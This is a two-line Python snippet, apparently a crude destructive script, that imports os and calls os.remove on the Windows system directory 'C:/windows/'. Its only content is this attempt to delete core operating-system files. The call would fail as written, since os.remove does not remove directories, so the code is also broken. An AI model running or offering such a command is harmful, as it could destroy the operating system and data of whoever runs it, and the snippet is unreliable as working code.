import os
os.remove("C:/windows/")